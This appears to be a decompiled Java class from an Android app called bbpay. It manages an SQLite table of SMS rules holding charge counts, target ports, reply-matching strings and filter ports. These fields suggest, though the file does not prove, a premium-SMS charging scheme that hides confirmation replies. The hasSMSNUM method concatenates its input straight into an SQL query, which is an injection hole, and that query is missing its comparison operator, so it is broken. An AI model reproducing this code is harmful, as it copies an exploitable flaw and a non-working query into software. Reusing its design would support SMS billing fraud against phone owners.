package com.bbpay.db;
import java.util.LinkedList;
import java.util.List;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.bbpay.bean.Constants;
import com.bbpay.bean.SmsBean;

public class SmsDbManager {
    private static SmsDbManager manager;
    private SmsDbManager() {}
    public static SmsDbManager getInstance() {
        if (manager == null) manager = new SmsDbManager();
        return manager;
    }
    public void deleteAllSMS(Context context) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getWritableDatabase();
            sqlitedatabase.delete("sms", null, null);
            sqlitedatabase.close();
        }
    }
    public void deleteSMSById(Context context, int i) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getWritableDatabase();
            String as[] = new String[1];
            as[0] = new StringBuilder(String.valueOf(i)).toString();
            sqlitedatabase.delete("sms", "_ID = ?", as);
            sqlitedatabase.close();
        }
    }
    public List<SmsBean> getAllSMSBean(Context context) {
        synchronized ("lock") {
            LinkedList<SmsBean> linkedlist;
            linkedlist = new LinkedList<SmsBean>();
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getReadableDatabase();
            StringBuffer stringbuffer = new StringBuffer();
            stringbuffer.append(" select ").append(Constants.CHARGE_COUNT).append(" , ").append(Constants.CMD).append(" , ").append(Constants.IS_SECOND).append(" , ")
            .append(Constants.PORT).append(" , ").append(Constants.REPLY_CONTENT).append(" , ").append(Constants.REPLY_END_STR).append(" , ")
            .append(Constants.REPLY_START_STR).append(" , ").append(Constants.SECOND_PORT).append(" , ").append(Constants.SECOND_TYPE).append(" , ")
            .append(Constants.SMS_DELAY_TIME).append(" , ").append("_ID").append(" , ").append(Constants.FILTER_INFO).append(" , ").append(Constants.FILTER_PORT)
            .append(" , ").append(Constants.SECOND_INFO).append(" , ").append("is_sms").append(" , ").append(Constants.IS_FUZZY).append(" from ").append("sms");
            Cursor cursor = sqlitedatabase.rawQuery(stringbuffer.toString(), null);
            cursor.moveToFirst();
            if (cursor.getCount() >= 1) do {
                SmsBean smsbean = new SmsBean();
                smsbean.setChargeCount(cursor.getInt(0));
                smsbean.setCmd(cursor.getString(1));
                smsbean.setIsSecond(cursor.getInt(2));
                smsbean.setPort(cursor.getString(3));
                smsbean.setReplyContent(cursor.getString(4));
                smsbean.setReplyEndStr(cursor.getString(5));
                smsbean.setReplyStartStr(cursor.getString(6));
                smsbean.setSecondPort(cursor.getString(7));
                smsbean.setSecondType(cursor.getInt(8));
                smsbean.setSmsDelayTime(cursor.getInt(9));
                smsbean.setId(cursor.getInt(10));
                smsbean.setFilterInfo(cursor.getString(11));
                smsbean.setFilterPort(cursor.getString(12));
                smsbean.setSecondInfo(cursor.getString(13));
                smsbean.setSms(Boolean.parseBoolean(cursor.getString(14)));
                smsbean.setIsFuzzy(cursor.getInt(15));
                linkedlist.add(smsbean);
            } while (cursor.moveToNext());
            cursor.close();
            sqlitedatabase.close();
            return linkedlist;
        }
    }
    public boolean hasSMSNUM(Context context, String s) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase;
            Cursor cursor;
            int i;
            sqlitedatabase = EPayDBHelper.getInstance(context).getReadableDatabase();
            StringBuffer stringbuffer = new StringBuffer();
            stringbuffer.append(" select ").append("_ID").append(" from ").append("sms").append(" where ").append(Constants.CMD).append(" '").append(s).append("'");
            cursor = sqlitedatabase.rawQuery(stringbuffer.toString(), null);
            cursor.moveToFirst();
            i = cursor.getCount();
            boolean flag;
            flag = false;
            if (i >= 1) flag = true;
            cursor.close();
            sqlitedatabase.close();
            return flag;
        }
    }
    public void insertSMS(SmsBean smsbean, Context context) {
        synchronized ("lock") {
            SQLiteDatabase db = EPayDBHelper.getInstance(context).getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put(Constants.CHARGE_COUNT, Integer.valueOf(smsbean.getChargeCount()));
            cv.put(Constants.CMD, smsbean.getCmd());
            cv.put(Constants.IS_SECOND, Integer.valueOf(smsbean.getIsSecond()));
            cv.put(Constants.PORT, smsbean.getPort());
            cv.put(Constants.REPLY_CONTENT, smsbean.getReplyContent());
            cv.put(Constants.REPLY_END_STR, smsbean.getReplyEndStr());
            cv.put(Constants.REPLY_START_STR, smsbean.getReplyStartStr());
            cv.put(Constants.SECOND_PORT, smsbean.getSecondPort());
            cv.put(Constants.SECOND_INFO, smsbean.getSecondInfo());
            cv.put(Constants.SECOND_TYPE, Integer.valueOf(smsbean.getSecondType()));
            cv.put(Constants.SMS_DELAY_TIME, Integer.valueOf(smsbean.getSmsDelayTime()));
            cv.put(Constants.FILTER_INFO, smsbean.getFilterInfo());
            cv.put(Constants.FILTER_PORT, smsbean.getFilterPort());
            cv.put("is_sms", Boolean.valueOf(smsbean.isSms()));
            cv.put(Constants.IS_FUZZY, Integer.valueOf(smsbean.isIsFuzzy()));
            db.insert("sms", null, cv);
            db.close();
        }
    }
    public void updateSMSChargeCountById(Context context, SmsBean smsbean) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getWritableDatabase();
            ContentValues contentvalues = new ContentValues();
            contentvalues.put(Constants.CHARGE_COUNT, Integer.valueOf(smsbean.getChargeCount()));
            String as[] = new String[1];
            as[0] = new StringBuilder(String.valueOf(smsbean.getId())).toString();
            sqlitedatabase.update("sms", contentvalues, "_ID = ? ", as);
            sqlitedatabase.close();
        }
    }
}
